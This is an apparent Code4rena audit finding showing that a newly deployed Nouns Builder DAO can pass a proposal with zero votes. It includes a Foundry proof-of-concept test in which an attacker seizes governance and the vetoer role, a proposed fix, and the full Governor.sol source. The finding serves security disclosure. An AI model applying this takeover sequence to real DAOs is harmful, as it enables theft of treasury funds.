{
  "Title": "[M-17] A proposal can pass with 0 votes in favor at early DAO stages",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441\n\n\n# Vulnerability details\n\nIt's possible to create a proposal for a DAO as soon as it's deployed and the proposal can pass even if nobody votes.\n\nThis possibility of doing so is based on the following assumptions:\n1. The vetoer doesn't veto the proposal\n2. `proposal.quorumVotes` is 0, which happens when `token.totalSupply() * settings.quorumThresholdBps < 10_000`\n3. `proposal.proposalThreshold` is 0, which happens when `token.totalSupply() * settings.proposalThresholdBps < 10_000`\n\nThe amount of time necessary to create and execute a proposal of this kind is dictated by `governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()`, the lower the time the higher the risk.\n\n## Impact\nA malicious actor could build an off-chain script that tracks `DAODeployed` events on the `Manager.sol` contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.\n\n\nA potential proposal created by an attacker might look like this:\n1. Call `governor.updateVetoer(attacker)`\n1. Call `governor.updateVotingDelay(0)`\n2. Call `governor.updateVotingPeriod(0)`\n3. Call `treasury.updateGracePeriod(0)`\n4. Call `treasury.updateDelay(1 day)`\n\nWith this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there's any bid he can take the funds.\n\nThis is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.\n\n## Proof of Concept\nHere's a test I wrote that proves the attack path outlined above, you can copy it into `Gov.t.sol` and execute it with `forge test -m test_sneakProposalAttack`:\n\n```javascript\n function test_sneakProposalAttack() public {\n        address attacker = vm.addr(0x55);\n\n        address[] memory targets = new address[](5);\n        uint256[] memory values = new uint256[](5);\n        bytes[] memory calldatas = new bytes[](5);\n\n        // 1. Call `governor.updateVetoer(attacker)`\n        targets[0] = address(governor);\n        values[0] = 0;\n        calldatas[0] = abi.encodeWithSignature(\"updateVetoer(address)\", attacker);\n\n        // 2. Call `governor.updateVotingDelay(0)`\n        targets[1] = address(governor);\n        values[1] = 0;\n        calldatas[1] = abi.encodeWithSignature(\"updateVotingDelay(uint256)\", 0);\n\n        //3. Call `governor.updateVotingPeriod(0)`\n        targets[2] = address(governor);\n        values[2] = 0;\n        calldatas[2] = abi.encodeWithSignature(\"updateVotingPeriod(uint256)\", 0);\n\n        //3. Call `treasury.updateGracePeriod(0)`\n        targets[3] = address(treasury);\n        values[3] = 0;\n        calldatas[3] = abi.encodeWithSignature(\"updateGracePeriod(uint256)\", 0);\n\n        //4. Call `treasury.updateDelay(1 day)`\n        targets[4] = address(treasury);\n        values[4] = 0;\n        calldatas[4] = abi.encodeWithSignature(\"updateDelay(uint256)\", 60 * 60 * 24);\n\n        //Attacker creates proposal as soon as contract is deployed\n        bytes32 proposalId = governor.propose(targets, values, calldatas, \"\");\n\n        //Wait for proposal.voteEnd\n        vm.warp((governor.getProposal(proposalId).voteEnd));\n\n        //Queue it\n        governor.queue(proposalId);\n\n        //Wait for treasury delay\n        vm.warp(block.timestamp + treasury.delay());\n\n        //Execute proposal\n        governor.execute(targets, values, calldatas, keccak256(bytes(\"\")));\n\n        //Shows it's now possible for an attacker to queue a proposal immediately\n        bytes32 proposalId2 = governor.propose(targets, values, calldatas, \"mock\");\n        governor.queue(proposalId2);\n\n        //And executed it after one day\n        vm.warp(block.timestamp + 60 * 60 * 24);\n        governor.execute(targets, values, calldatas, keccak256(bytes(\"mock\")));\n    }\n\n```\n\n## Recommended Mitigation Steps\nThis potential attack path comes from a combination of factors, maninly:\n1. A proposal can be created directly after deployment\n2. The `proposal.proposal.proposalThreshold` and `proposal.quorumVotes` are set to 0 at such early stages\n3. A proposal with 0 votes is allowed to pass\n\nI would say that requiring at least 1 vote for a proposal to be considered `Succeeded` is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.\n\nAt [Governor.sol#L441](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441) we have:\n\n```javscript\nelse if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n        return ProposalState.Defeated;\n}\n```\nwhich can be changed to:\n```javscript\nelse if (proposal.forVotes == 0 || proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n        return ProposalState.Defeated;\n}\n```\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-09-nouns-builder-contest",
  "Code": [
    {
      "filename": "src/governance/governor/Governor.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { UUPS } from \"../../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../../lib/utils/Ownable.sol\";\nimport { EIP712 } from \"../../lib/utils/EIP712.sol\";\nimport { SafeCast } from \"../../lib/utils/SafeCast.sol\";\n\nimport { GovernorStorageV1 } from \"./storage/GovernorStorageV1.sol\";\nimport { Token } from \"../../token/Token.sol\";\nimport { Treasury } from \"../treasury/Treasury.sol\";\nimport { IManager } from \"../../manager/IManager.sol\";\nimport { IGovernor } from \"./IGovernor.sol\";\n\n/// @title Governor\n/// @author Rohan Kulkarni\n/// @notice A DAO's proposal manager and transaction scheduler\n/// Modified from:\n/// - OpenZeppelin Contracts v4.7.3 (governance/extensions/GovernorTimelockControl.sol)\n/// - NounsDAOLogicV1.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\ncontract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n    ///                                                          ///\n    ///                         CONSTANTS                        ///\n    ///                                                          ///\n\n    /// @notice The EIP-712 typehash to vote with a signature\n    bytes32 public constant VOTE_TYPEHASH = keccak256(\"Vote(address voter,uint256 proposalId,uint256 support,uint256 nonce,uint256 deadline)\");\n\n    ///                                                          ///\n    ///                         IMMUTABLES                       ///\n    ///                                                          ///\n\n    /// @notice The contract upgrade manager\n    IManager private immutable manager;\n\n    ///                                                          ///\n    ///                         CONSTRUCTOR                      ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    constructor(address _manager) payable initializer {\n        manager = IManager(_manager);\n    }\n\n    ///                                                          ///\n    ///                         INITIALIZER                      ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's governor\n    /// @param _treasury The DAO's treasury address\n    /// @param _token The DAO's governance token address\n    /// @param _vetoer The address eligible to veto proposals\n    /// @param _votingDelay The voting delay\n    /// @param _votingPeriod The voting period\n    /// @param _proposalThresholdBps The proposal threshold basis points\n    /// @param _quorumThresholdBps The quorum threshold basis points\n    function initialize(\n        address _treasury,\n        address _token,\n        address _vetoer,\n        uint256 _votingDelay,\n        uint256 _votingPeriod,\n        uint256 _proposalThresholdBps,\n        uint256 _quorumThresholdBps\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Ensure non-zero addresses are provided\n        if (_treasury == address(0)) revert ADDRESS_ZERO();\n        if (_token == address(0)) revert ADDRESS_ZERO();\n\n        // Store the governor settings\n        settings.treasury = Treasury(payable(_treasury));\n        settings.token = Token(_token);\n        settings.vetoer = _vetoer;\n        settings.votingDelay = SafeCast.toUint48(_votingDelay);\n        settings.votingPeriod = SafeCast.toUint48(_votingPeriod);\n        settings.proposalThresholdBps = SafeCast.toUint16(_proposalThresholdBps);\n        settings.quorumThresholdBps = SafeCast.toUint16(_quorumThresholdBps);\n\n        // Initialize EIP-712 support\n        __EIP712_init(string.concat(settings.token.symbol(), \" GOV\"), \"1\");\n\n        // Grant ownership to the treasury\n        __Ownable_init(_treasury);\n    }\n\n    ///                                                          ///\n    ///                         HASH PROPOSAL                    ///\n    ///                                                          ///\n\n    /// @notice Hashes a proposal's details into a proposal id\n    /// @param _targets The target addresses to call\n    /// @param _values The ETH values of each call\n    /// @param _calldatas The calldata of each call\n    /// @param _descriptionHash The hash of the description\n    function hashProposal(\n        address[] memory _targets,\n        uint256[] memory _values,\n        bytes[] memory _calldatas,\n        bytes32 _descriptionHash\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encode(_targets, _values, _calldatas, _descriptionHash));\n    }\n\n    ///                                                          ///\n    ///                        CREATE PROPOSAL                   ///\n    ///                                                          ///\n\n    /// @notice Creates a proposal\n    /// @param _targets The target addresses to call\n    /// @param _values The ETH values of each call\n    /// @param _calldatas The calldata of each call\n    /// @param _description The proposal description\n    function propose(\n        address[] memory _targets,\n        uint256[] memory _values,\n        bytes[] memory _calldatas,\n        string memory _description\n    ) external returns (bytes32) {\n        // Get the current proposal threshold\n        uint256 currentProposalThreshold = proposalThreshold();\n\n        // Cannot realistically underflow and `getVotes` would revert\n        unchecked {\n            // Ensure the caller's voting weight is greater than or equal to the threshold\n            if (getVotes(msg.sender, block.timestamp - 1) < proposalThreshold()) revert BELOW_PROPOSAL_THRESHOLD();\n        }\n\n        // Cache the number of targets\n        uint256 numTargets = _targets.length;\n\n        // Ensure at least one target exists\n        if (numTargets == 0) revert PROPOSAL_TARGET_MISSING();\n\n        // Ensure the number of targets matches the number of values and calldata\n        if (numTargets != _values.length) revert PROPOSAL_LENGTH_MISMATCH();\n        if (numTargets != _calldatas.length) revert PROPOSAL_LENGTH_MISMATCH();\n\n        // Compute the description hash\n        bytes32 descriptionHash = keccak256(bytes(_description));\n\n        // Compute the proposal id\n        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);\n\n        // Get the pointer to store the proposal\n        Proposal storage proposal = proposals[proposalId];\n\n        // Ensure the proposal doesn't already exist\n        if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId);\n\n        // Used to store the snapshot and deadline\n        uint256 snapshot;\n        uint256 deadline;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the snapshot and deadline\n            snapshot = block.timestamp + settings.votingDelay;\n            deadline = snapshot + settings.votingPeriod;\n        }\n\n        // Store the proposal data\n        proposal.voteStart = uint32(snapshot);\n        proposal.voteEnd = uint32(deadline);\n        proposal.proposalThreshold = uint32(currentProposalThreshold);\n        proposal.quorumVotes = uint32(quorum());\n        proposal.proposer = msg.sender;\n        proposal.timeCreated = uint32(block.timestamp);\n\n        emit ProposalCreated(proposalId, _targets, _values, _calldatas, _description, descriptionHash, proposal);\n\n        return proposalId;\n    }\n\n    ///                                                          ///\n    ///                          CAST VOTE                       ///\n    ///                                                          ///\n\n    /// @notice Casts a vote\n    /// @param _proposalId The proposal id\n    /// @param _support The support value (0 = Against, 1 = For, 2 = Abstain)\n    function castVote(bytes32 _proposalId, uint256 _support) external returns (uint256) {\n        return _castVote(_proposalId, msg.sender, _support, \"\");\n    }\n\n    /// @notice Casts a vote with a reason\n    /// @param _proposalId The proposal id\n    /// @param _support The support value (0 = Against, 1 = For, 2 = Abstain)\n    /// @param _reason The vote reason\n    function castVoteWithReason(\n        bytes32 _proposalId,\n        uint256 _support,\n        string memory _reason\n    ) external returns (uint256) {\n        return _castVote(_proposalId, msg.sender, _support, _reason);\n    }\n\n    /// @notice Casts a signed vote\n    /// @param _voter The voter address\n    /// @param _proposalId The proposal id\n    /// @param _support The support value (0 = Against, 1 = For, 2 = Abstain)\n    /// @param _deadline The signature deadline\n    /// @param _v The 129th byte and chain id of the signature\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function castVoteBySig(\n        address _voter,\n        bytes32 _proposalId,\n        uint256 _support,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external returns (uint256) {\n        // Ensure the deadline has not passed\n        if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();\n\n        // Used to store the signed digest\n        bytes32 digest;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the message\n            digest = keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(VOTE_TYPEHASH, _voter, _proposalId, _support, nonces[_voter]++, _deadline))\n                )\n            );\n        }\n\n        // Recover the message signer\n        address recoveredAddress = ecrecover(digest, _v, _r, _s);\n\n        // Ensure the recovered signer is the given voter\n        if (recoveredAddress == address(0) || recoveredAddress != _voter) revert INVALID_SIGNATURE();\n\n        return _castVote(_proposalId, _voter, _support, \"\");\n    }\n\n    /// @dev Stores a vote\n    /// @param _proposalId The proposal id\n    /// @param _voter The voter address\n    /// @param _support The vote choice\n    function _castVote(\n        bytes32 _proposalId,\n        address _voter,\n        uint256 _support,\n        string memory _reason\n    ) internal returns (uint256) {\n        // Ensure voting is active\n        if (state(_proposalId) != ProposalState.Active) revert VOTING_NOT_STARTED();\n\n        // Ensure the voter hasn't already voted\n        if (hasVoted[_proposalId][_voter]) revert ALREADY_VOTED();\n\n        // Ensure the vote is valid\n        if (_support > 2) revert INVALID_VOTE();\n\n        // Record the voter as having voted\n        hasVoted[_proposalId][_voter] = true;\n\n        // Get the pointer to the proposal\n        Proposal storage proposal = proposals[_proposalId];\n\n        // Used to store the voter's weight\n        uint256 weight;\n\n        // Cannot realistically underflow and `getVotes` would revert\n        unchecked {\n            // Get the voter's weight at the time the proposal was created\n            weight = getVotes(_voter, proposal.timeCreated);\n\n            // If the vote is against:\n            if (_support == 0) {\n                // Update the total number of votes against\n                proposal.againstVotes += uint32(weight);\n\n                // Else if the vote is for:\n            } else if (_support == 1) {\n                // Update the total number of votes for\n                proposal.forVotes += uint32(weight);\n\n                // Else if the vote is to abstain:\n            } else if (_support == 2) {\n                // Update the total number of votes abstaining\n                proposal.abstainVotes += uint32(weight);\n            }\n        }\n\n        emit VoteCast(_voter, _proposalId, _support, weight, _reason);\n\n        return weight;\n    }\n\n    ///                                                          ///\n    ///                        QUEUE PROPOSAL                    ///\n    ///                                                          ///\n\n    /// @notice Queues a proposal\n    /// @param _proposalId The proposal id\n    function queue(bytes32 _proposalId) external returns (uint256 eta) {\n        // Ensure the proposal has succeeded\n        if (state(_proposalId) != ProposalState.Succeeded) revert PROPOSAL_UNSUCCESSFUL();\n\n        // Schedule the proposal for execution\n        eta = settings.treasury.queue(_proposalId);\n\n        emit ProposalQueued(_proposalId, eta);\n    }\n\n    ///                                                          ///\n    ///                       EXECUTE PROPOSAL                   ///\n    ///                                                          ///\n\n    /// @notice Executes a proposal\n    /// @param _targets The target addresses to call\n    /// @param _values The ETH values of each call\n    /// @param _calldatas The calldata of each call\n    /// @param _descriptionHash The hash of the description\n    function execute(\n        address[] calldata _targets,\n        uint256[] calldata _values,\n        bytes[] calldata _calldatas,\n        bytes32 _descriptionHash\n    ) external payable returns (bytes32) {\n        // Get the proposal id\n        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, _descriptionHash);\n\n        // Ensure the proposal is queued\n        if (state(proposalId) != ProposalState.Queued) revert PROPOSAL_NOT_QUEUED(proposalId);\n\n        // Mark the proposal as executed\n        proposals[proposalId].executed = true;\n\n        // Execute the proposal\n        settings.treasury.execute{ value: msg.value }(_targets, _values, _calldatas, _descriptionHash);\n\n        emit ProposalExecuted(proposalId);\n\n        return proposalId;\n    }\n\n    ///                                                          ///\n    ///                        CANCEL PROPOSAL                   ///\n    ///                                                          ///\n\n    /// @notice Cancels a proposal\n    /// @param _proposalId The proposal id\n    function cancel(bytes32 _proposalId) external {\n        // Ensure the proposal hasn't been executed\n        if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();\n\n        // Get a copy of the proposal\n        Proposal memory proposal = proposals[_proposalId];\n\n        // Cannot realistically underflow and `getVotes` would revert\n        unchecked {\n            // Ensure the caller is the proposer or the proposer's voting weight has dropped below the proposal threshold\n            if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold)\n                revert INVALID_CANCEL();\n        }\n\n        // Update the proposal as canceled\n        proposals[_proposalId].canceled = true;\n\n        // If the proposal was queued:\n        if (settings.treasury.isQueued(_proposalId)) {\n            // Cancel the proposal\n            settings.treasury.cancel(_proposalId);\n        }\n\n        emit ProposalCanceled(_proposalId);\n    }\n\n    ///                                                          ///\n    ///                        VETO PROPOSAL                     ///\n    ///                                                          ///\n\n    /// @notice Vetoes a proposal\n    /// @param _proposalId The proposal id\n    function veto(bytes32 _proposalId) external {\n        // Ensure the caller is the vetoer\n        if (msg.sender != settings.vetoer) revert ONLY_VETOER();\n\n        // Ensure the proposal has not been executed\n        if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();\n\n        // Get the pointer to the proposal\n        Proposal storage proposal = proposals[_proposalId];\n\n        // Update the proposal as vetoed\n        proposal.vetoed = true;\n\n        // If the proposal was queued:\n        if (settings.treasury.isQueued(_proposalId)) {\n            // Cancel the proposal\n            settings.treasury.cancel(_proposalId);\n        }\n\n        emit ProposalVetoed(_proposalId);\n    }\n\n    ///                                                          ///\n    ///                        PROPOSAL STATE                    ///\n    ///                                                          ///\n\n    /// @notice The state of a proposal\n    /// @param _proposalId The proposal id\n    function state(bytes32 _proposalId) public view returns (ProposalState) {\n        // Get a copy of the proposal\n        Proposal memory proposal = proposals[_proposalId];\n\n        // Ensure the proposal exists\n        if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();\n\n        // If the proposal was executed:\n        if (proposal.executed) {\n            return ProposalState.Executed;\n\n            // Else if the proposal was canceled:\n        } else if (proposal.canceled) {\n            return ProposalState.Canceled;\n\n            // Else if the proposal was vetoed:\n        } else if (proposal.vetoed) {\n            return ProposalState.Vetoed;\n\n            // Else if voting has not started:\n        } else if (block.timestamp < proposal.voteStart) {\n            return ProposalState.Pending;\n\n            // Else if voting has not ended:\n        } else if (block.timestamp < proposal.voteEnd) {\n            return ProposalState.Active;\n\n            // Else if the proposal failed (outvoted OR didn't reach quorum):\n        } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n            return ProposalState.Defeated;\n\n            // Else if the proposal has not been queued:\n        } else if (settings.treasury.timestamp(_proposalId) == 0) {\n            return ProposalState.Succeeded;\n\n            // Else if the proposal can no longer be executed:\n        } else if (settings.treasury.isExpired(_proposalId)) {\n            return ProposalState.Expired;\n\n            // Else the proposal is queued\n        } else {\n            return ProposalState.Queued;\n        }\n    }\n\n    /// @notice The voting weight of an account at a timestamp\n    /// @param _account The account address\n    /// @param _timestamp The specific timestamp\n    function getVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n        return settings.token.getPastVotes(_account, _timestamp);\n    }\n\n    /// @notice The current number of votes required to submit a proposal\n    function proposalThreshold() public view returns (uint256) {\n        unchecked {\n            return (settings.token.totalSupply() * settings.proposalThresholdBps) / 10_000;\n        }\n    }\n\n    /// @notice The current number of votes required to be in favor of a proposal in order to reach quorum\n    function quorum() public view returns (uint256) {\n        unchecked {\n            return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;\n        }\n    }\n\n    /// @notice The data stored for a given proposal\n    /// @param _proposalId The proposal id\n    function getProposal(bytes32 _proposalId) external view returns (Proposal memory) {\n        return proposals[_proposalId];\n    }\n\n    /// @notice The timestamp when voting starts for a proposal\n    /// @param _proposalId The proposal id\n    function proposalSnapshot(bytes32 _proposalId) external view returns (uint256) {\n        return proposals[_proposalId].voteStart;\n    }\n\n    /// @notice The timestamp when voting ends for a proposal\n    /// @param _proposalId The proposal id\n    function proposalDeadline(bytes32 _proposalId) external view returns (uint256) {\n        return proposals[_proposalId].voteEnd;\n    }\n\n    /// @notice The vote counts for a proposal\n    /// @param _proposalId The proposal id\n    function proposalVotes(bytes32 _proposalId)\n        external\n        view\n        returns (\n            uint256,\n            uint256,\n            uint256\n        )\n    {\n        Proposal memory proposal = proposals[_proposalId];\n\n        return (proposal.againstVotes, proposal.forVotes, proposal.abstainVotes);\n    }\n\n    /// @notice The timestamp valid to execute a proposal\n    /// @param _proposalId The proposal id\n    function proposalEta(bytes32 _proposalId) external view returns (uint256) {\n        return settings.treasury.timestamp(_proposalId);\n    }\n\n    ///                                                          ///\n    ///                      GOVERNOR SETTINGS                   ///\n    ///                                                          ///\n\n    /// @notice The basis points of the token supply required to create a proposal\n    function proposalThresholdBps() external view returns (uint256) {\n        return settings.proposalThresholdBps;\n    }\n\n    /// @notice The basis points of the token supply required to reach quorum\n    function quorumThresholdBps() external view returns (uint256) {\n        return settings.quorumThresholdBps;\n    }\n\n    /// @notice The amount of time until voting begins after a proposal is created\n    function votingDelay() external view returns (uint256) {\n        return settings.votingDelay;\n    }\n\n    /// @notice The amount of time to vote on a proposal\n    function votingPeriod() external view returns (uint256) {\n        return settings.votingPeriod;\n    }\n\n    /// @notice The address eligible to veto any proposal (address(0) if burned)\n    function vetoer() external view returns (address) {\n        return settings.vetoer;\n    }\n\n    /// @notice The address of the governance token\n    function token() external view returns (address) {\n        return address(settings.token);\n    }\n\n    /// @notice The address of the treasury\n    function treasury() external view returns (address) {\n        return address(settings.treasury);\n    }\n\n    ///                                                          ///\n    ///                       UPDATE SETTINGS                    ///\n    ///                                                          ///\n\n    /// @notice Updates the voting delay\n    /// @param _newVotingDelay The new voting delay\n    function updateVotingDelay(uint256 _newVotingDelay) external onlyOwner {\n        emit VotingDelayUpdated(settings.votingDelay, _newVotingDelay);\n\n        settings.votingDelay = SafeCast.toUint48(_newVotingDelay);\n    }\n\n    /// @notice Updates the voting period\n    /// @param _newVotingPeriod The new voting period\n    function updateVotingPeriod(uint256 _newVotingPeriod) external onlyOwner {\n        emit VotingPeriodUpdated(settings.votingPeriod, _newVotingPeriod);\n\n        settings.votingPeriod = SafeCast.toUint48(_newVotingPeriod);\n    }\n\n    /// @notice Updates the minimum proposal threshold\n    /// @param _newProposalThresholdBps The new proposal threshold basis points\n    function updateProposalThresholdBps(uint256 _newProposalThresholdBps) external onlyOwner {\n        emit ProposalThresholdBpsUpdated(settings.proposalThresholdBps, _newProposalThresholdBps);\n\n        settings.proposalThresholdBps = SafeCast.toUint16(_newProposalThresholdBps);\n    }\n\n    /// @notice Updates the minimum quorum threshold\n    /// @param _newQuorumVotesBps The new quorum votes basis points\n    function updateQuorumThresholdBps(uint256 _newQuorumVotesBps) external onlyOwner {\n        emit QuorumVotesBpsUpdated(settings.quorumThresholdBps, _newQuorumVotesBps);\n\n        settings.quorumThresholdBps = SafeCast.toUint16(_newQuorumVotesBps);\n    }\n\n    /// @notice Updates the vetoer\n    /// @param _newVetoer The new vetoer address\n    function updateVetoer(address _newVetoer) external onlyOwner {\n        if (_newVetoer == address(0)) revert ADDRESS_ZERO();\n\n        emit VetoerUpdated(settings.vetoer, _newVetoer);\n\n        settings.vetoer = _newVetoer;\n    }\n\n    /// @notice Burns the vetoer\n    function burnVetoer() external onlyOwner {\n        emit VetoerUpdated(settings.vetoer, address(0));\n\n        delete settings.vetoer;\n    }\n\n    ///                                                          ///\n    ///                       GOVERNOR UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and that the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {\n        // Ensure the new implementation is a registered upgrade\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}"
    }
  ]
}